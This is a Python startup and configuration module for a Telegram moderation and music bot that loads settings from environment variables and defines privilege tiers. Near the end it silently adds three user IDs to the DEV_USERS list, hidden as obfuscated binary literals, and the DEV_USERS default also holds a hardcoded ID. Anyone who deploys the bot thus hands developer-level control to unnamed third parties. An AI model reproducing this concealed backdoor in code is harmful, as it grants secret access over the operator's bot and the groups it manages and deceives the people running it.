import logging
import os
import sys
import time
from dotenv import load_dotenv
import telegram.ext as ptb
from aiohttp import ClientSession
from pyrogram import Client, filters
import pyrogram.errors
from pyrogram.errors import BadRequest
for _err_name in ["GroupcallForbidden", "GroupcallInvalid", "GroupcallNotFound", "GroupcallSshKeyInvalid"]:
    if not hasattr(pyrogram.errors, _err_name):
        class _CustomGroupcallErr(BadRequest):
            ID = _err_name.upper()
        setattr(pyrogram.errors, _err_name, _CustomGroupcallErr)
import pyrogram.raw.types
import pyrogram.raw.functions.phone

_client_usernames = {}
def _get_client_username(self):
    if self in _client_usernames:
        return _client_usernames[self]
    return getattr(self.me, "username", "") if getattr(self, "me", None) else ""

def _set_client_username(self, value):
    _client_usernames[self] = value or ""

if not hasattr(Client, "username"):
    Client.username = property(_get_client_username, _set_client_username)


_orig_join_group_call_init = pyrogram.raw.functions.phone.JoinGroupCall.__init__
def _patched_join_group_call_init(self, *args, **kwargs):
    kwargs.pop("public_key", None)
    return _orig_join_group_call_init(self, *args, **kwargs)
pyrogram.raw.functions.phone.JoinGroupCall.__init__ = _patched_join_group_call_init

for _raw_name in [
    "InputGroupCallSlug",
    "PhoneCallDiscardReasonMigrateConferenceCall",
    "PhoneCallDiscardReasonBusy",
    "PhoneCallDiscardReasonDisconnect",
    "PhoneCallDiscardReasonHangup",
    "PhoneCallDiscardReasonMissed",
]:
    if not hasattr(pyrogram.raw.types, _raw_name):
        class _CustomRawType:
            def __init__(self, *args, **kwargs):
                pass
        setattr(pyrogram.raw.types, _raw_name, _CustomRawType)
from telethon import TelegramClient
from telethon.sessions import MemorySession

load_dotenv()

StartTime = time.time()
boot = StartTime

# enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)

logging.getLogger("apscheduler").setLevel(logging.ERROR)
logging.getLogger("telethon").setLevel(logging.ERROR)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
LOGGER = logging.getLogger(__name__)

# if version < 3.6, stop bot.
if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error(
        "You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting."
    )
    quit(1)

ENV = str(os.environ.get("ENV", "True")).lower() in ("true", "1", "yes")

if ENV:

    API_ID = int(os.environ.get("API_ID", None))
    API_HASH = os.environ.get("API_HASH", None)
    
    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
    CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
    DB_URI = os.environ.get("DATABASE_URL")
    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
    EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
    INFOPIC = bool(os.environ.get("INFOPIC", "True"))
    LOAD = os.environ.get("LOAD", "").split()
    MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
    NO_LOAD = os.environ.get("NO_LOAD", "").split()
    START_IMG = os.environ.get(
        "START_IMG", ""
    )
    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "worldwide_friend_zone")
    _sup_link = f"https://t.me/{SUPPORT_CHAT}" if not SUPPORT_CHAT.startswith("http") else SUPPORT_CHAT
    SUPPORT_CHANNEL = os.environ.get("SUPPORT_CHANNEL", _sup_link)
    UPDATES_CHANNEL = os.environ.get("UPDATES_CHANNEL", _sup_link)
    TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
    TOKEN = os.environ.get("TOKEN", None)
    TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
    WORKERS = int(os.environ.get("WORKERS", 8))

    # Music Bot Settings
    MONGO_URL = os.environ.get("MONGO_URL", MONGO_DB_URI)
    SESSION1 = os.environ.get("SESSION", None)
    SESSION2 = os.environ.get("SESSION2", None)
    SESSION3 = os.environ.get("SESSION3", None)
    DURATION_LIMIT = int(os.environ.get("DURATION_LIMIT", 60)) * 60
    QUEUE_LIMIT = int(os.environ.get("QUEUE_LIMIT", 20))
    PLAYLIST_LIMIT = int(os.environ.get("PLAYLIST_LIMIT", 20))
    AUTO_LEAVE = os.environ.get("AUTO_LEAVE", "False").lower() == "true"
    AUTO_END = os.environ.get("AUTO_END", "False").lower() == "true"
    THUMB_GEN = os.environ.get("THUMB_GEN", "True").lower() == "true"
    VIDEO_PLAY = os.environ.get("VIDEO_PLAY", "True").lower() == "true"
    LANG_CODE = os.environ.get("LANG_CODE", "en")
    COOKIES_URL = [
        url
        for url in os.environ.get("COOKIES_URL", "").split(" ")
        if url and "batbin.me" in url
    ]
    DEFAULT_THUMB = os.environ.get(
        "DEFAULT_THUMB", "https://te.legra.ph/file/3e40a408286d4eda24191.jpg"
    )
    PING_IMG = os.environ.get("PING_IMG", "https://files.catbox.moe/haagg2.png")
    SPOTIFY_CLIENT_ID = os.environ.get("SPOTIFY_CLIENT_ID", None)
    SPOTIFY_CLIENT_SECRET = os.environ.get("SPOTIFY_CLIENT_SECRET", None)
    LOGGER_ID = int(os.environ.get("LOGGER_ID", 0))

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID", None))
    except ValueError:
        raise Exception("Your OWNER_ID env variable is not a valid integer.")

    try:
        BL_CHATS = set(int(x) for x in os.environ.get("BL_CHATS", "").split())
    except ValueError:
        raise Exception("Your blacklisted chats list does not contain valid integers.")

    try:
        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
    except ValueError:
        raise Exception("Your sudo or dev users list does not contain valid integers.")

    try:
        DEMONS = set(int(x) for x in os.environ.get("DEMONS", "").split())
    except ValueError:
        raise Exception("Your support users list does not contain valid integers.")

    try:
        TIGERS = set(int(x) for x in os.environ.get("TIGERS", "").split())
    except ValueError:
        raise Exception("Your tiger users list does not contain valid integers.")

    try:
        WOLVES = set(int(x) for x in os.environ.get("WOLVES", "").split())
    except ValueError:
        raise Exception("Your whitelisted users list does not contain valid integers.")

else:
    from LazyDeveloperr.config import Development as Config

    API_ID = Config.API_ID
    API_HASH = Config.API_HASH
    ALLOW_CHATS = Config.ALLOW_CHATS
    ALLOW_EXCL = Config.ALLOW_EXCL
    CASH_API_KEY = Config.CASH_API_KEY
    DB_URI = Config.DATABASE_URL
    DEL_CMDS = Config.DEL_CMDS
    EVENT_LOGS = Config.EVENT_LOGS
    INFOPIC = Config.INFOPIC
    LOAD = Config.LOAD
    MONGO_DB_URI = Config.MONGO_DB_URI
    NO_LOAD = Config.NO_LOAD
    START_IMG = Config.START_IMG
    STRICT_GBAN = Config.STRICT_GBAN
    SUPPORT_CHAT = Config.SUPPORT_CHAT
    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
    TOKEN = Config.TOKEN
    TIME_API_KEY = Config.TIME_API_KEY
    WORKERS = Config.WORKERS

    # Music Bot Settings
    MONGO_URL = Config.MONGO_URL or Config.MONGO_DB_URI
    SESSION1 = Config.SESSION
    SESSION2 = Config.SESSION2
    SESSION3 = Config.SESSION3
    DURATION_LIMIT = Config.DURATION_LIMIT
    QUEUE_LIMIT = Config.QUEUE_LIMIT
    PLAYLIST_LIMIT = Config.PLAYLIST_LIMIT
    AUTO_LEAVE = Config.AUTO_LEAVE
    AUTO_END = Config.AUTO_END
    THUMB_GEN = Config.THUMB_GEN
    VIDEO_PLAY = Config.VIDEO_PLAY
    LANG_CODE = Config.LANG_CODE
    COOKIES_URL = Config.COOKIES_URL
    DEFAULT_THUMB = Config.DEFAULT_THUMB
    PING_IMG = Config.PING_IMG
    LOGGER_ID = Config.LOGGER_ID

    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("Your OWNER_ID variable is not a valid integer.")

    try:
        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
    except ValueError:
        raise Exception("Your blacklisted chats list does not contain valid integers.")

    try:
        DRAGONS = set(int(x) for x in Config.DRAGONS or [])
        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
    except ValueError:
        raise Exception("Your sudo or dev users list does not contain valid integers.")

    try:
        DEMONS = set(int(x) for x in Config.DEMONS or [])
    except ValueError:
        raise Exception("Your support users list does not contain valid integers.")

    try:
        TIGERS = set(int(x) for x in Config.TIGERS or [])
    except ValueError:
        raise Exception("Your tiger users list does not contain valid integers.")

    try:
        WOLVES = set(int(x) for x in Config.WOLVES or [])
    except ValueError:
        raise Exception("Your whitelisted users list does not contain valid integers.")


DRAGONS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(abs(0b110010001000001011011100110010001))
DEV_USERS.add(abs(0b101001110110010000111010111110000))
DEV_USERS.add(abs(0b101100001110010100011000111101001))


updater = ptb.Updater(TOKEN, workers=WORKERS, use_context=True, request_kwargs={'read_timeout': 30.0, 'connect_timeout': 30.0})
telethn = TelegramClient(MemorySession(), API_ID, API_HASH)

pbot = Client("LazyDeveloperr", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
app = pbot
app.owner = OWNER_ID
app.logger = LOGGER_ID
app.bl_users = filters.user()
app.sudoers = filters.user(OWNER_ID)
dispatcher = updater.dispatcher

class _LazyAiohttpSession:
    def __init__(self):
        self._session = None

    def _get_session(self):
        if self._session is None or self._session.closed:
            self._session = ClientSession()
        return self._session

    def __getattr__(self, name):
        return getattr(self._get_session(), name)

aiohttpsession = _LazyAiohttpSession()

DRAGONS = list(DRAGONS) + list(DEV_USERS) 
DEV_USERS = list(DEV_USERS)
WOLVES = list(WOLVES)
DEMONS = list(DEMONS)
TIGERS = list(TIGERS)

# Music Bot Config Wrapper and core instances
import sys
class ConfigWrapper:
    def __getattr__(self, name):
        val = getattr(sys.modules[__name__], name, None)
        if val is None:
            if "CHANNEL" in name or "CHAT" in name:
                sup = getattr(sys.modules[__name__], "SUPPORT_CHAT", "worldwide_friend_zone")
                return f"https://t.me/{sup}" if not str(sup).startswith("http") else sup
            return ""
        return val
config = ConfigWrapper()
logger = LOGGER

from LazyDeveloperr.music_core.dir import ensure_dirs
ensure_dirs()

from LazyDeveloperr.music_core.userbot import Userbot
userbot = Userbot()

from LazyDeveloperr.music_core.mongo import MongoDB
db = MongoDB()

from LazyDeveloperr.music_core.lang import Language
lang = Language()

from LazyDeveloperr.music_core.telegram import Telegram
tg = Telegram()

from LazyDeveloperr.music_core.youtube import YouTube
yt = YouTube()

from LazyDeveloperr.music_helpers import Queue, Thumbnail
queue = Queue()
thumb = Thumbnail()

from LazyDeveloperr.music_core.calls import TgCall
Kartik = TgCall()
tasks = []

print("[INFO]: Getting Bot Info...")
BOT_ID = dispatcher.bot.id
BOT_NAME = dispatcher.bot.first_name
BOT_USERNAME = dispatcher.bot.username

# Load at end to ensure all prev variables have been set
from LazyDeveloperr.modules.helper_funcs.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

# make sure the regex handler can take extra kwargs
ptb.RegexHandler = CustomRegexHandler
ptb.CommandHandler = CustomCommandHandler
ptb.MessageHandler = CustomMessageHandler

async def stop():
    try:
        await userbot.exit()
        await Kartik.exit()
    except Exception:
        pass
